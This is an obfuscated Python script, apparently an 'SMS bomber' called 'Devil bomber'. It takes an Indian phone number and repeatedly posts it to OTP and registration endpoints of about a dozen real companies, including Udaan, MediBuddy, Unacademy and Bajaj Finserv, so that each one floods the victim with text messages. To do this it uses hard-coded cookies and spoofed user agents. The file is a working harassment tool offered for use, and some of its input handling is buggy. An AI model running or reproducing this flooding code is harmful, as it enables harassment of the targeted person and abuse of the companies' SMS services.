
#===========================================||
#================PROJECT INFO===============||
#===========================================||
#==== Auther : SM02 PresenT ================||
#==== Start Date : 12/09/2023 ==============||
#==== Version : 1.0 BETA ===================||
#==== About :  Sms  bomber =================||
#==== Requremnts : fake_useragent,requests =||
#==== Note : Do Not Copy This Code , =======||
#===========================================||
#================END INFO===================||
#===========================================||

license = '''
MIT License
Copyright (c) 2020 - 2023 The  SM02

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE. 
         if You Have Any Problem Contact Me On telegram : simplehacker1
         
  
'''
print(license)

import requests ,json ,time #line:1
from fake_useragent import UserAgent #line:2

myip =requests .get ('https://www.wikipedia.org').headers ['X-Client-IP']#line:6
def logo ():#line:8
    print ("\033[31m")#line:10
    print ("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")#line:12
    print ("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")#line:13
    print ("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")#line:14
    print ("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")#line:15
    print ("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")#line:16
    print ("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")#line:17
    print (" Your IP is : "+myip )#line:18
    print (" \033[33m  Devil bomber  \n")#line:19
ua =UserAgent ()#line:3
def smsm (O0OOOOOOO00OOO0O0 ,OO0000OOOO0OOOO0O ):#line:22
    OO0000OOOO0OOOO0O =int (OO0000OOOO0OOOO0O )#line:24
    O00O0O00O00OOO0OO =ua .chrome #line:26
    for OO0OO0OO0O0OO000O in range (OO0000OOOO0OOOO0O ):#line:27
        OOOO0OOO000000OOO ={'Host':'auth.udaan.com','content-length':'17','x-app-id':'udaan-auth','traceparent':'00-94a6e0bccbb332c53f129ca9ef6e71b8-adcc060214b06b40-00','accept-language':'en-IN','user-agent':O00O0O00O00OOO0OO ,'content-type':'application/x-www-form-urlencoded;charset=UTF-8','accept':'*/*','origin':'https://auth.udaan.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2','accept-encoding':'gzip, deflate, br','cookie':'sid=VwCKAOdskvwBAMG2xSZrbZL8vd99bdRvTMx/Z/YD4NhfjkbIZf2IzF7TQ902OazS9KIv2orueg81btncDxMM1rbq',}#line:45
        OOOOOOO0O000OOOOO =(('client_id','udaan-v2'),)#line:49
        O0OO00O0OO0O00O00 ={'mobile':O0OOOOOOO00OOO0O0 }#line:53
        O0000OO00OO00O0O0 =requests .post ('https://auth.udaan.com/api/otp/send',headers =OOOO0OOO000000OOO ,params =OOOOOOO0O000OOOOO ,data =O0OO00O0OO0O00O00 );pass #line:55
        OOOO0OOO000000OOO ={'Host':'udaan.com','content-length':'29','accept':'application/json, text/javascript, */*; q=0.01','x-requested-with':'XMLHttpRequest','user-agent':O00O0O00O00OOO0OO ,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://udaan.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://udaan.com/login','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'s=1kj2b02sprzis1rfarco1px4we',}#line:73
        OOOOOOO0O000OOOOO =(('cmd','send'),)#line:77
        O0OO00O0OO0O00O00 ={'try_count':'0','mobile':O0OOOOOOO00OOO0O0 }#line:82
        O0000OO00OO00O0O0 =requests .post ('https://udaan.com/login',headers =OOOO0OOO000000OOO ,params =OOOOOOO0O000OOOOO ,data =O0OO00O0OO0O00O00 );pass #line:84
        OOOO0OOO000000OOO ={'Host':'api.penpencil.co','content-length':'75','client-version':'2.4.13','user-agent':O00O0O00O00OOO0OO ,'content-type':'application/json','accept':'application/json, text/plain, */*','randomid':'f518c78d-f241-4db0-a891-9f6524c710b4','client-id':'5eb393ee95fab7468a79d189','client-type':'WEB','origin':'https://www.pw.live','x-requested-with':'pure.lite.browser','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.pw.live/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:108
        O0OO00O0OO0O00O00 ='{"mobile": "1234", "countryCode": "+91", "firstName": "Sss", "lastName": ""}'#line:110
        O0OO00O0OO0O00O00 =O0OO00O0OO0O00O00 .replace ('1234',O0OOOOOOO00OOO0O0 )#line:111
        O0000OO00OO00O0O0 =requests .post ('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:113
        OOOO0OOO000000OOO ={'Host':'api.penpencil.co','content-length':'75','client-version':'2.4.13','user-agent':O00O0O00O00OOO0OO ,'content-type':'application/json','accept':'application/json, text/plain, */*','randomid':'f518c78d-f241-4db0-a891-9f6524c710b4','client-id':'5eb393ee95fab7468a79d189','client-type':'WEB','origin':'https://www.pw.live','x-requested-with':'pure.lite.browser','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.pw.live/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:137
        O0OO00O0OO0O00O00 ='{"mobile":"'+O0OOOOOOO00OOO0O0 +'","countryCode":"+91","firstName":"Sss","lastName":""}'#line:139
        O0000OO00OO00O0O0 =requests .post ('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:141
        OOOO0OOO000000OOO ={'Host':'api.toolsvilla.com','content-length':'66','accept':'application/json, text/plain, */*','pageurl':'/?gad_source=1&gclid=EAIaIQobChMIqLni4dvuggMVfyR7Bx0LXQcaEAAYASAAEgJY3PD_BwE','user-agent':O00O0O00O00OOO0OO ,'content-type':'application/json','origin':'https://www.toolsvilla.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.toolsvilla.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:159
        O0OO00O0OO0O00O00 ='{"firstname":"","mobileno":"'+O0OOOOOOO00OOO0O0 +'","email":"","wtpSubs":"true"}'#line:161
        O0000OO00OO00O0O0 =requests .post ('https://api.toolsvilla.com/web/register',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:163
        OOOO0OOO000000OOO ={'Host':'goplus.in','Connection':'keep-alive','Content-Length':'67','deviceId':'abc','User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','Content-Type':'application/json;charset=UTF-8','Accept':'application/json','deviceVersion':'0','platform':'ANDROID','appVersion':'v1.0','Origin':'https://mobile.shuttltech.com','X-Requested-With':'pure.lite.browser','Sec-Fetch-Site':'cross-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://mobile.shuttltech.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:186
        O0OO00O0OO0O00O00 ='{"phoneNumber":"'+O0OOOOOOO00OOO0O0 +'","newDevice":"false","policyPerused":true}'#line:188
        O0000OO00OO00O0O0 =requests .post ('https://goplus.in/v3/auth/user/otp',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:190
        OOOO0OOO000000OOO ={'Host':'api.cureskin.com','content-length':'299','baggage':'sentry-environment=production,sentry-release=app%402.0.462,sentry-public_key=f50a2ba984c66e974c85651f3672ff35,sentry-trace_id=6c8710e4d4ae4b8c9d4386cb86768fc3','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','sentry-trace':'6c8710e4d4ae4b8c9d4386cb86768fc3-93f53738ec36fd4f-0','content-type':'text/plain','accept':'*/*','origin':'https://app.cureskin.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.cureskin.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:208
        O0OO00O0OO0O00O00 ='{"mobileNumber":"'+O0OOOOOOO00OOO0O0 +'","deviceId":"f63754ef4d120ddb59d4","source":"web","time":"2023-12-01T16:29:33.767Z","digest":"ce95fea5ec919a57325732a7fbdec2d75232ec27a95ecc28f7bf7e04e70e55f6","_ApplicationId":"myAppId","_ClientVersion":"js3.4.4","_InstallationId":"12d7f289-c92d-4ce8-9e77-ad3bf4deaf8f"}'#line:210
        O0000OO00OO00O0O0 =requests .post ('https://api.cureskin.com/api/parse/functions/requestOTP',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:212
        OOOO0OOO000000OOO ={'Host':'loginprod.medibuddy.in','content-length':'202','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','origin':'https://www.medibuddy.in','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.medibuddy.in/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:228
        O0OO00O0OO0O00O00 ='{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+O0OOOOOOO00OOO0O0 +'","flow":"Retail-Login-Home-Flow","idealLoginFlow":false,"advertiserId":"8f191ec6-b5c8-Ld51-830f-65892ff7fb13","mbUserId":null}'#line:230
        O0000OO00OO00O0O0 =requests .post ('https://loginprod.medibuddy.in/unified-login/user/register',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:232
        OOOO0OOO000000OOO ={'Host':'unacademy.com','content-length':'107','x-platform':'7','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://unacademy.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://unacademy.com/login?redirectTo=%2Fsettings','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'anonymous_session_id=aae2b19d_5c59_44ba_aa88_f50a8b49ffd5',}#line:250
        OOOOOOO0O000OOOOO =(('enable-email','true'),)#line:254
        O0OO00O0OO0O00O00 ='{"phone":"'+O0OOOOOOO00OOO0O0 +'","country_code":"IN","otp_type":1,"email":"","send_otp":"true","is_un_teach_user":false}'#line:256
        O0000OO00OO00O0O0 =requests .post ('https://unacademy.com/api/v3/user/user_check/',headers =OOOO0OOO000000OOO ,params =OOOOOOO0O000OOOOO ,data =O0OO00O0OO0O00O00 );pass #line:258
        OOOO0O000000OO000 ={'cookie:campaignCookienew':'{"utm_medium":"bfl","utm_campaign":NA,"utm_keyword":NA,"utm_content":NA,"utm_source":"organic_myaccount"}',}#line:266
        OOOO0OOO000000OOO ={'Host':'www.bajajfinserv.in','content-length':'136','tracestate':'2442591@nr=0-1-2364187-1120225423-a1676216f73520a0----1701447794700','traceparent':'00-53e72ff78740605b404c2a4ce9009e00-a1676216f73520a0-01','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','newrelic':'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIzNjQxODciLCJhcCI6IjExMjAyMjU0MjMiLCJpZCI6ImExNjc2MjE2ZjczNTIwYTAiLCJ0ciI6IjUzZTcyZmY3ODc0MDYwNWI0MDRjMmE0Y2U5MDA5ZTAwIiwidGkiOjE3MDE0NDc3OTQ3MDAsInRrIjoiMjQ0MjU5MSJ9fQ==','content-type':'application/x-www-form-urlencoded; charset=UTF-8','accept':'*/*','x-requested-with':'XMLHttpRequest','request-id':'|0f55808691fe4f568fde7ae869c35b20.a2f8bbb358924c93','origin':'https://www.bajajfinserv.in','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.bajajfinserv.in/myaccountlogin/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'kampyleSessionPageCounter=1',}#line:287
        O0OO00O0OO0O00O00 ={'CLType':'INDIVIDUAL','Mobile_Email':O0OOOOOOO00OOO0O0 ,'DOB':'','Pan_No':'','IP':'','Device':'','Device_Info':'','Browser_Type':'Safari','Source':'Login','LoginType':'1','EventClick':''}#line:301
        O0000OO00OO00O0O0 =requests .post ('https://www.bajajfinserv.in/MyAccountLogin/Login/GetOTP',headers =OOOO0OOO000000OOO ,cookies =OOOO0O000000OO000 ,data =O0OO00O0OO0O00O00 );pass #line:303
        OOOO0OOO000000OOO ={'Host':'www.my11circle.com','content-length':'123','cache-control':'max-age=0','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://www.my11circle.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.my11circle.com/player/login.html','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3D',}#line:323
        O0OO00O0OO0O00O00 ='{"mobile":"'+O0OOOOOOO00OOO0O0 +'","deviceId":"03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1","deviceName":"","refCode":"","isPlaycircle":false}'#line:324
        O0000OO00OO00O0O0 =requests .post ('https://www.my11circle.com/api/fl/auth/v3/getOtp',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:325
        OOOO0OOO000000OOO ={'Host':'www.rummycircle.com','content-length':'123','cache-control':'max-age=0','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','accept':'*/*','origin':'https://www.rummycircle.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.rummycircle.com/loginnow.html','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7','cookie':'AWSALBCORS=1tS0LdJM+fFwf4IHgfQpZbU6wVU1Rd6+xr7qaWCxlF1jYyVHAvY2I2Fua8JNR5whrvS/xBuubwutIJi+o4mDObqaVQKCCTZ99oMcFQSLtfGniKBTsRwSYvbBa8af',}#line:343
        O0OO00O0OO0O00O00 ='{"mobile":"'+O0OOOOOOO00OOO0O0 +'","deviceId":"6ebd671c-a5f7-4baa-904b-89d4f898ee79","deviceName":"","refCode":"","isPlaycircle":false}'#line:345
        O0000OO00OO00O0O0 =requests .post ('https://www.rummycircle.com/api/fl/auth/v3/getOtp',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 );pass #line:347
        OOOO0OOO000000OOO ={'Host':'api.khelbro.com','content-length':'42','accept':'application/json, text/plain, */*','x-auth-token':'undefined','user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','content-type':'application/json','origin':'https://khelbro.com','x-requested-with':'pure.lite.browser','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://khelbro.com/','accept-encoding':'gzip, deflate, br','accept-language':'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',}#line:364
        O0OO00O0OO0O00O00 ='{"mobile":"1234456","retryType":"text"}'#line:366
        O0OO00O0OO0O00O00 =O0OO00O0OO0O00O00 .replace ("1234456",O0OOOOOOO00OOO0O0 )#line:367
        O0000OO00OO00O0O0 =requests .post ('https://api.khelbro.com/api/v2/auth/resendOtp',headers =OOOO0OOO000000OOO ,data =O0OO00O0OO0O00O00 )#line:369
    print ('Boombing done')#line:371
    auther ()#line:372
def spam ():#line:377
    OOO0O0000OO0OO0OO =input ("\nEnter target No : +91")#line:378
    if OOO0O0000OO0OO0OO =='':#line:379
        print ('please enter target no ')#line:380
        time .sleep (1 )#line:381
        spam ()#line:382
    if len (OOO0O0000OO0OO0OO )==1 and OOO0O0000OO0OO0OO .isdigit ():#line:383
        O0O0OO0O000OO0O0O =input ("Enter which Time repeat : ")#line:385
        if O0O0OO0O000OO0O0O =='':#line:386
            print ("\nBombing Started")#line:387
            smsm (number =OOO0O0000OO0OO0OO ,repeat ='1')#line:388
        if O0O0OO0O000OO0O0O .isdigit ():#line:389
            print ("\nBombing Started")#line:390
            smsm (number =OOO0O0000OO0OO0OO ,repeat =O0O0OO0O000OO0O0O )#line:391
        else :#line:392
            print ("Input should be exactly one digit.")#line:393
            time .sleep (1 )#line:394
            spam ()#line:395
    else :#line:397
        print ("Input should be exactly one digit.")#line:398
        time .sleep (1 )#line:399
        spam ()#line:400
def auther ():#line:406
    print ("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")#line:407
    print ("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")#line:408
    print ("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")#line:409
    print ("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")#line:410
    print ("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")#line:411
    print ("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")#line:412
    print ("\033[31m   SM02 PRESENT \n")#line:414
    print ("\n")#line:415
    time .sleep (1 )#line:416
    exit #line:417
def menu ():#line:419
    logo ()#line:420
    print ("\033[31m    ╔════════════════╗")#line:421
    print ("\033[31m    ║✧ 1\033[32m mix bomb    \033[31m║")#line:422
    print ("\033[31m    ║✧ 2\033[32m update      \033[31m║")#line:423
    print ("\033[31m    ║✧ 3\033[32m Auther      \033[31m║")#line:424
    print ("\033[31m    ╚✧ 4\033[32m Exit       \033[31m✧╝")#line:425
    O0OO0OO0000O00O0O =input ("    \nEnter Your Choice : ")#line:426
    if (O0OO0OO0000O00O0O =="1"):#line:427
        time .sleep (1 )#line:428
        spam ()#line:429
    elif (O0OO0OO0000O00O0O =="2"):#line:430
        print ("\033[31m commin soon\033[31m")#line:431
        time .sleep (1 )#line:432
        menu ()#line:433
    elif (O0OO0OO0000O00O0O =="3"):#line:436
        auther ()#line:437
    elif (O0OO0OO0000O00O0O =="4"):#line:438
        logo ()#line:439
        print ("Thanks For using My tool")#line:440
        exit ()#line:441
    else :#line:442
        print ("\n Please choice in 1 to 6")#line:443
        time .sleep (1 )#line:444
        menu ()#line:445
if __name__ =="__main__":#line:448
    menu ()#line:449
